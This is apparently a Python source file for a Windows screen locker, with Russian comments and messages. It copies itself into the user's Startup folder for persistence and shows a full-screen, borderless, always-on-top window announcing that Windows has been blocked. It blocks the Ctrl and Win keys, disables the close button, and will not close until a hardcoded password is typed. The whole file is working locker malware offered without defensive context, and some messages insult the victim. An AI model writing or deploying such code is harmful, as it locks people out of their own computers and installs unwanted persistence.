from tkinter import *
from tkinter import messagebox
import keyboard
import os, sys

Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
    os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')


t = Tk()
t["bg"] = "black"

x = t.winfo_screenheight()
y = t.winfo_screenwidth()

t.geometry(f"{y}x{x}")

keyboard.block_key("ctrl")
keyboard.block_key("win")

def btn_click():
    k = pas.get()
    if k == "u206isfh40294":
        messagebox.showwarning("gjlsutpwq", "<>>></nf/f/>>><>")
        t.destroy()
    elif k == "":
        messagebox.showwarning("ДАУН", "\n\n\n\n\n\nТЫ НИЧЕ НЕ ВВЕЛ\n\n\n\n\n\n\n\n\n\n")
    else:
        messagebox.showwarning("НЕПРАВИЛЬНО", "ВВЕДИ ПРАВИЛЬНЫЙ ПАРОЛЬ")


def Quiet():
    pass
    messagebox.showerror("КУДА СОБРАЛСЯ", "ВВЕДИ ПАРОЛЬ")

t.protocol("WM_DELETE_WINDOW", Quiet)
t.attributes("-topmost", True)
t.overrideredirect(True)

l = Label(t, text="Windows был заблокирован", bg = "black", fg= "red", font=("Arial", 30)).pack()
pas = Entry(bg = "black", fg = "green",font=("Ariel", 50), selectbackground="green", selectforeground="red")
pas.pack()

b = Button(t, text = "Разблокировать", bg="black", fg="red",font=("Arial", 30), command=btn_click).pack()
l0 = Label(t, text="\nвведите пароль", bg = "black", fg= "snow",font=("Arial", 50)).pack()




t.mainloop()


